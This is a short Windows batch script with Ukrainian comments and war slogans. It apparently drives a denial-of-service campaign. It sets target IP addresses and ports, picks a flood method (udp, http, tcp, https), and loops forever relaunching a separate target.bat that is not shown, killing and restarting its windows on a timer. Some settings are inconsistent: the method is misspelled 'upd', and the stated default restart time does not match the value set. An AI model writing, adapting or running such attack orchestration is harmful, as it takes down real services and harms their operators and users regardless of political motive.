setlocal EnableDelayedExpansion
@echo off
chcp 65001
set t=Русский корабль, иди нах@й!
title=Все буде Україна!

:: IP-адреси парашки, добавляемо через кому
set IP= 

:: Порти для IP-адрес, добавляемо через кому
set PORT=

:: Метод атаки: udp (default), http, tcp, https
set METHOD=upd

:: Час для перезапуску, за замовчуванням 3 хвилини(180 секунд)
set TIME=600

:: Час відпочинку (За замовчуванням 10 секунд)
set REST=3

:loop
start "%t%" target.bat
timeout /t %TIME% 
taskkill /FI "WindowTitle eq %t%*" /T /F
FOR %%i IN (%IP%) DO (
FOR %%p IN (%PORT%) DO (
taskkill /FI "WindowTitle eq %%i | %%p*" /T /F
)
)
timeout /t %REST% 
goto loop